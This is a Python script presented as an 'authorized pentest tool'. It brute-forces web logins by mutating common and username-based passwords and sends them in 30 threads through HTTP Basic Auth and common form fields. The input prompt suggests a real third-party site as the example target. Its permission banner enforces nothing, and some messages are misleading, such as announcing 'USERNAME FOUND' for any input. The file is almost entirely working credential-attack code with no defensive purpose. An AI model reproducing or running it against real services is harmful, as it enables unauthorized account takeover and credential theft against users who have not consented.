#!/usr/bin/env python3
"""
Interactive Mutational Brute-Force Tool - Step-by-Step
1. Input target → Validate
2. Input username → Validate  
3. Auto-generate & mutate passwords → Brute-force
4. Report results
"""

import requests
import threading
import time
import string
from concurrent.futures import ThreadPoolExecutor
import paramiko
import logging
import queue
import sys
from urllib.parse import urlparse

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

print("🔒 AUTHORIZED PENTEST TOOL - I confirm you have permission to test this target")
print("=" * 60)

class InteractiveMutationalBrute:
    def __init__(self, target, username, threads=30, timeout=5):
        self.target = target.rstrip('/')
        self.username = username
        self.threads = threads
        self.timeout = timeout
        
        self.charset = {
            'lower': string.ascii_lowercase,
            'upper': string.ascii_uppercase, 
            'digit': string.digits,
            'special': '!@#$%^&*()_+-=[]{}|;:,.<>?'
        }
        
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.found_passwords = []
        self.mutation_queue = queue.Queue()
        self.results_lock = threading.Lock()
        self.stats = {'tested': 0, 'found': 0}

    def validate_target(self):
        """Check if target responds"""
        try:
            r = self.session.get(self.target, timeout=10, allow_redirects=True)
            logger.info(f"✅ LINK FOUND: {self.target} (Status: {r.status_code})")
            return True
        except:
            logger.error("❌ LINK NOT FOUND - Check URL/IP and connectivity")
            return False

    def generate_base_passwords(self):
        """Generate common base passwords"""
        bases = [
            f"{self.username}", f"{self.username}123", f"{self.username}2024",
            "password", "123456", "admin", "qwerty", "letmein",
            f"{self.username}1", f"{self.username}@123", "Password1"
        ]
        return bases

    def generate_single_position_mutations(self, password):
        """Mutate ONE position at a time"""
        mutations = []
        for pos in range(len(password)):
            original = password[pos]
            for char_type, chars in self.charset.items():
                for new_char in chars:
                    if new_char != original:
                        mutated = password[:pos] + new_char + password[pos+1:]
                        mutations.append((mutated, pos, char_type))
        return mutations

    def test_password(self, password):
        """Test single password"""
        self.stats['tested'] += 1
        
        try:
            # Try common auth methods
            # 1. Basic Auth
            r = self.session.get(self.target, auth=(self.username, password), 
                               timeout=self.timeout, allow_redirects=False)
            if r.status_code == 200:
                return True
            
            # 2. Form POST (common fields)
            for form_data in [
                {'username': self.username, 'password': password},
                {'user': self.username, 'pass': password},
                {'email': self.username, 'pwd': password},
                {'login': self.username, 'password': password}
            ]:
                r = self.session.post(self.target, data=form_data, timeout=self.timeout)
                if any(success in r.text.lower() for success in 
                      ['welcome', 'dashboard', 'profile', 'logout', 'success']):
                    return True
                    
        except:
            pass
        return False

    def worker(self):
        """Worker thread"""
        while True:
            try:
                mutation = self.mutation_queue.get(timeout=1)
                password, pos, char_type = mutation
                
                if self.test_password(password):
                    with self.results_lock:
                        logger.info(f"✅ PASSWORD FOUND: {self.username}:{password}")
                        logger.info(f"   (Mutation: pos{pos} → {char_type})")
                        self.found_passwords.append(password)
                        
                        # CONTINUE MUTATING successful password
                        next_mutations = self.generate_single_position_mutations(password)
                        for nm in next_mutations[:30]:  # Controlled explosion
                            self.mutation_queue.put(nm)
                
                self.mutation_queue.task_done()
            except queue.Empty:
                break

    def run_bruteforce(self):
        """Execute full attack"""
        logger.info(f"🔥 Starting bruteforce for {self.username}")
        logger.info(f"💻 Threads: {self.threads}")
        
        start_time = time.time()
        
        # Generate initial mutations
        base_passwords = self.generate_base_passwords()
        logger.info(f"📝 Generated {len(base_passwords)} base passwords")
        
        initial_mutations = 0
        for base_pwd in base_passwords:
            mutations = self.generate_single_position_mutations(base_pwd)
            for m in mutations:
                self.mutation_queue.put(m)
                initial_mutations += 1
        
        logger.info(f"⚡ {initial_mutations:,} mutations queued")
        
        # Launch attack
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(lambda _: self.worker(), range(self.threads))
        
        elapsed = time.time() - start_time
        logger.info(f"\n⏱️  Attack complete: {elapsed:.1f}s")
        logger.info(f"📊 Tested: {self.stats['tested']:,} | Found: {self.stats['found']}")
        
        self.print_final_results()

    def print_final_results(self):
        """Final report"""
        print("\n" + "="*60)
        print("🏆 PENTEST RESULTS")
        print("="*60)
        
        if self.found_passwords:
            print(f"✅ USERNAME FOUND: {self.username}")
            print("✅ PASSWORDS FOUND:")
            for pwd in self.found_passwords:
                print(f"   🔑 {self.username}:{pwd}")
            print("\n🎉 SUCCESSFUL PENTEST!")
        else:
            print(f"❌ No passwords found for {self.username}")
            print("💡 Try different base passwords or increase threads")

def main():
    print("🔒 INTERACTIVE MUTATIONAL BRUTE-FORCE TOOL")
    print("👨‍💻 For authorized penetration testing only")
    
    # Step 1: Get target
    while True:
        target = input("\n📡 Enter target URL/IP (e.g. http://instagram.com): ").strip()
        if not target:
            print("❌ Target required!")
            continue
            
        bruteforcer = InteractiveMutationalBrute(target, "", timeout=8)
        if bruteforcer.validate_target():
            print("✅ LINK FOUND!")
            break
        print("Try again...")

    # Step 2: Get username  
    while True:
        username = input("\n👤 Enter username to test: ").strip()
        if username:
            print(f"✅ USERNAME FOUND: {username}")
            bruteforcer.username = username
            break
        print("❌ Username required!")

    # Step 3: Optional threads
    threads = input("⏱️  Threads (default 30, Enter for default): ").strip()
    if threads.isdigit():
        bruteforcer.threads = int(threads)
    
    # Step 4: EXECUTE!
    print("\n🚀 LAUNCHING MUTATIONAL ATTACK...")
    print("💥 Auto-generating + mutating passwords...")
    bruteforcer.run_bruteforce()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⛔ Attack stopped by user")
